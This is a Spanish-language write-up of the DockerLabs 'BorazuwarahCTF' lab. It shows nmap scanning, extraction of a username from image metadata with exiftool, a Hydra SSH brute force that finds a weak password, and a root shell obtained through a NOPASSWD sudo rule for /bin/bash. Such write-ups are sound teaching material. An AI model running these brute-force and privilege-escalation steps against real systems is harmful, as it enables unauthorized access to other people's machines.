---
title: BorazuwarahCTF
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-04
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf_logo.png
categories:
  - Docker Labs
tags:
  - linux
  - dockerlabs
  - ssh
  - http
  - tcp
  - steganography
  - password attacks
  - sudo abuse
  - information gathering
  - web analysis
  - vulnerability exploitation
  - privilege escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos. 

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG nmap1 127.17.0.2
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 22/open/tcp//ssh///, 80/open/tcp//http///        Ignored State: closed (65533)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ sudo nmap -sCV -p22,80 -vvv -oN nmap2 127.17.0.2
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3d:fd:d7:c8:17:97:f5:12:b1:f5:11:7d:af:88:06:fe (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDuOdJLZN+CNU+7dcTJQbPr6zY2+Ou1YFR0w9Pan1DfaPUZljRHJcNmvSncrihzQ3HOAHfMWWvSzN+ZMC0YmWoA=
|   256 43:b3:ba:a9:32:c9:01:43:ee:62:d0:11:12:1d:5d:17 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGDv2JqKvBCR+Badmkr7YKPypEYshuCXxzM5+YdozyBD
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
```terminal
$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.59], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], IP[127.17.0.2]
```

---
## Web Analysis

Al analizar el servicio web, solo se muestra una página vacía que contiene una imagen. 

![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf1.png)

Al inspeccionar el código fuente de la página, confirmo que el único contenido relevante es la referencia a una imagen con el nombre `imagen.jpeg`.

![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf2.png)

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ wget http://127.17.0.2/imagen.jpeg
--2025-01-04 20:28:53--  http://127.17.0.2/imagen.jpeg
Connecting to 127.17.0.2:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18667 (18K) [image/jpeg]
Saving to: ‘imagen.jpeg’

imagen.jpeg                                 100%[===========================================================================================>]  18.23K  --.-KB/s    in 0s
2025-01-04 20:28:53 (1.03 GB/s) - ‘imagen.jpeg’ saved [18667/18667]
```

Descargo la imagen y utilizo exiftool para extraer los metadatos. En ellos encuentro un usuario `borazuwarah`.

Después de descargar la imagen del servidor, utilizo exiftool para analizar los metadatos en busca de información útil. Este análisis revela el usuario `borazuwarah`.

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ exiftool imagen.jpeg
```

![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf3.png)

Con el nombre de usuario `borazuwarah`, realizo un ataque de fuerza bruta contra el servicio SSH.

---
## Vulnerability Exploitation

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ sudo hydra -l borazuwarah -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10 -I
[22][ssh] host: 172.17.0.2   login: borazuwarah   password: 123456
```

![](assets/img/dockerlabs-writeup-borazuwarahctf/borazuwarahctf4.png)

El ataque tiene éxito y obtengo las credenciales SSH.

```terminal
/home/kali/Documents/dockerlabs/borazuwarahctf:-$ ssh borazuwarah@127.17.0.2
borazuwarah@127.17.0.2's password: 123456

borazuwarah@kali:~$ id
uid=1000(borazuwarah) gid=1000(borazuwarah) groups=1000(borazuwarah),27(sudo)
```

---
## Privilege Escalation


```terminal
borazuwarah@kali:~$ cat /etc/passwd | grep /bash$
root:x:0:0:root:/root:/bin/bash
borazuwarah:x:1000:1000::/home/borazuwarah:/bin/bash
```

El usuario `borazuwarah` tiene permisos completos para ejecutar cualquier comando como cualquier usuario, incluyendo `root`.

```terminal
borazuwarah@kali:~$ sudo -l
Matching Defaults entries for borazuwarah on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User borazuwarah may run the following commands on kali:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /bin/bash
```

Dado que el usuario puede ejecutar `/bin/bash` como `root` sin proporcionar contraseña, inicio una shell con privilegios de superusuario. La ejecución de este comando eleva mis privilegios al usuario `root`, confirmando el control completo del sistema.

```terminal
borazuwarah@kali:~$ sudo /bin/bash
root@kali:/home/borazuwarah# id
uid=0(root) gid=0(root) groups=0(root)
```